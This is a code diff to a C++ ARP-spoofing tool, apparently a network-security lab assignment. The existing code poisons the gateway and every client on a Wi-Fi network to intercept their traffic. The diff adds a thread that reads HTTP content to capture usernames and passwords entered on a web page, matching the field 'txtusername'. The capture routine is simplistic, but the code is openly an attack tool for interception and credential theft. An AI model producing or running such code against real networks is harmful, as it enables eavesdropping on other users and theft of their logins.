@@ -327,6 +327,65 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 
 }
+void analyze_packet(){
+    // filter the received packet: HTTP
+    // listen to the packets on the interface and filter the HTTP packets
+    int sockfd;
+    struct sockaddr_in servaddr, cli;
+
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        std::cerr << "Socket creation failed...\n";
+        exit(0);
+    }
+
+    bzero(&servaddr, sizeof(servaddr));
+
+    // Assign IP and port = 80
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    servaddr.sin_port = htons(80);
+
+    // Bind socket with IP and port
+    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0) {
+        std::cerr << "Socket bind failed...\n";
+        exit(0);
+    }
+
+    // Start listening
+    if ((listen(sockfd, 5)) != 0) {
+        std::cerr << "Listen failed...\n";
+        exit(0);
+    }
+
+    socklen_t len = sizeof(cli);
+
+    // Accept a connection
+    int connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
+    if (connfd < 0) {
+        std::cerr << "Server accept failed...\n";
+        exit(0);
+    }
+
+    char buff[4096];
+    bzero(buff, 4096);
+
+    // Read the packet
+    read(connfd, buff, sizeof(buff));
+
+    // Analyze the packet
+    std::string packet(buff);
+    if (packet.find("txtusername") != std::string::npos) {
+        std::cout << "Found packet with 'txtusername'\n";
+    }
+
+    // Close the socket
+    close(sockfd);
+    close(connfd);
+    cout<<"analyze packet done"<<endl;
+
+}
 void arp_spoofing()
 {
     string gateway_mac = devices[gateway_ip];
@@ -348,11 +407,15 @@ void arp_spoofing()
     // thread to send ARP reply to gateway and victim
     thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);
 
-
+    // task 3 :Fetch all the inputted usernames/passwords on a specific web pag  (Parse HTTP content and print out usernames/passwords)
+    thread analyze_thread(analyze_packet);
 
     
-
+    
     arp_reply_thread.join();
+    analyze_thread.join();
+
+
 }
 
 int main()
@@ -366,11 +429,9 @@ int main()
     list_devices();
 
     // task 2 : ARP spoofing for all other client devices in the Wi-Fi network
-    /*
-    Sending spoofed ARP packets to all neighbors (possible victims)
-    to trick AP we are the victim and trick the victim we are AP
-    */
     arp_spoofing();
+
+
 
     return 0;
 }
